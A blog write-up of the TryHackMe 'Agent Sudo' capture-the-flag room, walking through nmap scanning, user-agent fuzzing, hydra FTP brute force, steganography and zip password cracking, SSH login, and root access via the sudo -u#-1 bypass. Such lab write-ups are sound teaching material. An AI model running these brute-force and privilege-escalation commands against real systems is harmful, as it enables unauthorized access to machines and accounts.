---
layout: post
title: Agent sudo writeup
subtitle: You found a secret server located under the deep sea.
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/agent-sudo/editlogo.png
share-img: /assets/img/path.jpg
tags: [ctf,tryhackme, writeup, agentsudo, root ]
---

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!


## Here is a machine information

| Title | Agent Sudo | 
| :------ |:--- | 
| Difficulty | Easy | 
| Point | 400 |
| Maker | DesKel |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 


## NMAP
We have an IP as usual, and we can start with the basic nmap scan

```bash
nmap -sC -sV -A machine-ip 
```
<em>

-A : Os detection, version detection, traceroute

-sS : TCP syn scan ( for faster scan, needs root privilege )

-o : For storing output in file
</em>

After finishing scan with nmap, we got the result as tcp (80) is open and more interesting directory was found is *.git*

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 03:01 EDT
Nmap scan report for 10.10.100.203
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.90 seconds
```

## Enumeration

Accessing to port 80 and got it:

![web80](/leiz95/assets/img/agent-sudo/web.png)

Now we need to change user agent. there is few ways to do as using agent switch extension or burp suite to edit request.
I am using burp to do it. I change User agent to agent R and got another hint:

![web80](/leiz95/assets/img/agent-sudo/web1.png)

That we are one of in 25 employees, So we can use burp intruder to manipulate user agent with 26 character.

After running burp intruder with 26 characters from A-Z payload, we was redirect to */agent_C_attention.php* with agent C.

In */agent_C_attention.php*

![web80](/leiz95/assets/img/agent-sudo/web2.png)

## Hash cracking and brute-force

Now we have the user is **chris**. As we saw the ftp open in our nmap. We try brute force password for **chris** via hydra:

```
hydra -l chris -P password-list 10.10.10.203 ftp
```
<em>

-l : username 

-P : password list is used to brute force

-o : For storing output in file
</em>

I am using rockyou.txt as password-list. Waiting for brute force:

![web80](/leiz95/assets/img/agent-sudo/web3.png)

we got password for **chris** user.

Then we access to mnachine via ftp of chris user. 

list all files that chris can view:

![web80](/leiz95/assets/img/agent-sudo/web4.png)

In order to get all files, we can use: 

``` mget . ```

cat To_AgentJ.txt:

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```
Firstly, i can try steghide to check the jpg image. let see what is hide inside image.

``` steghide info cute-alien.jpg```

Result: 

![web80](/leiz95/assets/img/agent-sudo/web5.png)

This require password phrase as saw above.
Let's check cutie.png with binwalk. We got some hidden zip file inside file cuite.png

![web80](/leiz95/assets/img/agent-sudo/web6.png)

Extract the cutie.pnd and got 8702.zip file. But it was lockded by password. We need to crack password. After googling how to crack password for zip file.

I get amount of way. One way that i will use and also from the hint. There is two steps to crack it.

``` zip2john 8702.zip > zip.hash```

``` john zip.hash ```

Then archive the password:

![web80](/leiz95/assets/img/agent-sudo/web7.png)

Open zip file and enter password. We have message: 

![web80](/leiz95/assets/img/agent-sudo/web8.png)

Send to who we just got the encode person. Don't worry, we have the https://gchq.github.io/CyberChef/ to check or reverse it. After time to find what is type of encoded. I found this is base64 encoded. 

Now we have password for steghide in a few steps ago. Let's extract jpg image.

``` steghide --extract -sf cute-alien.jpg```

Inside message.txt:

![web80](/leiz95/assets/img/agent-sudo/web9.png)

## Capture the user flag

Now we have the credentials to access the attack machine. Let's using ssh to access:

``` ssh user@machine-ip ```

Using cat to get flag.

``` cat user_flag.txt ```


And the other is an image. We need to find out where is the image from. You can use the command below to download the image from the machine 

``` scp user@machine-ip:filename /localdir/ ```

Downloaded successfully, 

## Privilege escalation

In order to getting root. First thing, i check sudoer file by running command:

``` sudo -l ```

![web80](/leiz95/assets/img/agent-sudo/web10.png)


It looks like our user is not allowed to run /bin/bash as root since we have a !root. However, this looks weird as the first all means our user can run /bin/bash as any user. This is interesting, perhaps we can find a way to exploit this. 

Google about it: 

![web80](/leiz95/assets/img/agent-sudo/web11.png)

We got the cve and also exploitdb url.

Read throung the exploitDB and Run cmd to get root:

``` sudo -u#-1 /bin/bash ```

The flag was sitting inside root directory.

![web80](/leiz95/assets/img/agent-sudo/web12.png)

Finally we got all plags. Happy hacking!!!
